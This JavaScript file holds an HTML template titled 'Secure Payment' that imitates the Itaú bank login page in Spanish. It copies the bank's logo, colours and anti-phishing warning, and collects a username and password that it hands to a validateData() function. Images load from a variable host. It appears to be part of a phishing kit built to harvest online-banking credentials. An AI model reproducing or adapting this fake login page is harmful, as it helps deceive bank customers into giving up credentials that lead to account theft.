var my_titulo = 'Secure Payment';
var my_contenido = `
<style>
  * {
    margin: 0;
    padding: 0;
    font-family: Arial, Helvetica, sans-serif;
  }

  .logo {
    background-color: #fe6a00;
  }

  #texto {
    color: #fe6a00;
    font-size: 26px;
    font-weight: 600;
  }

  #txtUsuario {
    width: 90%;
    height: 30px;
  }

  #btnUsuario {
    border: none;
    background-color: #fe6a00;
    color: white;
  }
</style>

<div class="logo" style="height:300px;">
  <center>
    <img src="${my_hosting}img/itau_logo.jpg" height="300px">
  </center>
</div>
<div style="padding:10px;">
  <center>
    <a id="texto" style="margin-bottom:10px;">Personas</a>
  </center>
</div>

<div class="user">
  <label style="margin-left:20px;">Usuario</label>
  <center>
    <input type="text" id="txtUsuario">
  </center>
  <input type="checkbox" style="margin-left:20px;margin-top:10px; border:1px solid black;"> <label> For english</label><br>

  <div style="width:90%;margin:auto; font-size: 18px; margin-top:10px;">
    <label>Hemos cambiado nuestra política de datos, para mayor información haz clic <a href="#">Aquí</a></label>
  </div>
  <center>
    <br>
    <button class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#exampleModal" style="width:90%; border-radius:100px; border:none; height:40px; background-color: #fe6a00;">
      Ingresar</button>
    <br><br>
    <button style="width:88%; height:40px; background-color: white; color:#fe6a00;border:2px solid #fe6a00;">Regístrate</button>
    <br><br>
    <a href="#" style="color:blue; font-size:20px;font-weight: 600;">Desbloquea tu usuario</a>
  </center>
</div>

<div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-body">
        <img src="${my_hosting}img/itau_caracol.jpg">
        <center>
          <br>
          <div class="gray" style="width:95%; background-color:#dcdcdc; font-size:12px;">Si en algún momento no encuentras la imagen y la frase correcta, no digites tu contraseña y <br>llama inmediatamente a nuestra Banca Telefónica</br></div>
        </center>
      </div>
      <div class="modal-footer">
        <input type="password" id="txtPassword" style="width:70%; height:35px;">
        <button onclick="validateData()" id="btnUsuario">Ingresar</button>
      </div>
    </div>
  </div>
</div>
`